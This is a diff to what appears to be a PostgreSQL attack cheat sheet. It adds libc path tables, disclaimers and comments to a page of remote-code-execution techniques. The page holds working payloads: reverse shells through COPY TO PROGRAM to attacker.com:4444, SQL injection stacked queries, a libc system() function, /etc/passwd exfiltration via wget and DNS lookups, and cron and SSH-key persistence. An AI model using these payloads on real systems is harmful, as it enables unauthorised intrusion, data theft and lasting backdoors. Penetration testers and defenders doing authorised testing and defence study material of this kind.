@@ -48,11 +48,26 @@ COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|
 
 If you can load extensions:
 
+**libc path varies by distribution:**
+
+| Distribution       | Typical libc Path                 |
+| ------------------ | --------------------------------- |
+| Debian/Ubuntu      | `/lib/x86_64-linux-gnu/libc.so.6` |
+| RHEL/CentOS/Fedora | `/lib64/libc.so.6`                |
+| Alpine (musl)      | `/lib/ld-musl-x86_64.so.1`        |
+| Arch Linux         | `/usr/lib/libc.so.6`              |
+
+**Discovery:** `ldd /bin/ls | grep libc` or `locate libc.so.6`
+
 ```sql
 -- Create function mapping to libc system()
+-- Debian/Ubuntu path shown; adjust for target distribution
 CREATE OR REPLACE FUNCTION system(cstring) RETURNS int
 AS '/lib/x86_64-linux-gnu/libc.so.6', 'system'
 LANGUAGE C STRICT;
+
+-- RHEL/CentOS alternative:
+-- AS '/lib64/libc.so.6', 'system'
 
 -- Execute command
 SELECT system('id');
@@ -118,13 +133,17 @@ SELECT cmd('id');
 Using `/dev/tcp` (on systems that support it):
 
 ```sql
+-- Opens bidirectional TCP connection on fd 5, reads commands from socket,
+-- executes each line as shell command, redirects stdout/stderr back to socket
 COPY (SELECT '') TO PROGRAM 'exec 5<>/dev/tcp/attacker.com/4444; cat <&5 | while read line; do $line 2>&5 >&5; done';
 ```
 
-### Injection Examples
+### Injection Examples (Simplified/Educational)
+
+**⚠️ Disclaimer:** The following payloads are simplified educational examples that assume ideal conditions: no WAF, exact quote/comment context matching the injection point, stacked queries enabled, and no prepared statements. Real-world exploitation requires understanding the specific injection context (string vs numeric, single vs double quotes, comment syntax). See [Operations & Syntax](/postgresql/operations-syntax) for context-aware payload construction.
 
 ```sql
--- Basic command execution
+-- Basic command execution (assumes string context with single quotes, stacked queries)
 '; CREATE TABLE cmd(out TEXT); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd--
 
 -- Reverse shell
@@ -150,17 +169,19 @@ COPY (SELECT '') TO PROGRAM 'for line in $(cat /etc/passwd); do nslookup $line.a
 COPY (SELECT '') TO PROGRAM 'wget --post-data="$(cat /etc/passwd)" http://attacker.com/collect';
 ```
 
-### Persistence
+### Persistence (Limited Practicality)
+
+**⚠️ Warning:** The following techniques require elevated OS privileges beyond what the `postgres` user typically has. Writing to `/etc/cron.d/` requires root; writing to `~/.ssh/authorized_keys` requires access to the target user's home directory. These examples are largely aspirational and only work in misconfigured environments or after additional privilege escalation.
 
 ```sql
--- Add cron job (requires privilege escalation - postgres user cannot write to /etc/cron.d)
+-- Add cron job (requires root - postgres user cannot write to /etc/cron.d)
 COPY (SELECT '') TO PROGRAM 'echo "* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"" > /tmp/backdoor.cron';
+-- Would need: mv /tmp/backdoor.cron /etc/cron.d/ (as root)
 
--- Add SSH key (tee reads SELECT output from stdin)
+-- Add SSH key (only works if postgres user has write access to target's ~/.ssh)
+-- tee reads SELECT output from stdin
 COPY (SELECT 'ssh-rsa AAAA... attacker@host') TO PROGRAM 'tee -a ~/.ssh/authorized_keys';
 ```
-
-**Note:** The postgres OS user typically runs with limited privileges. Writing to system directories like `/etc/cron.d/` requires root access. These techniques may require additional privilege escalation or only work in misconfigured environments.
 
 ### Checking Available Methods
 
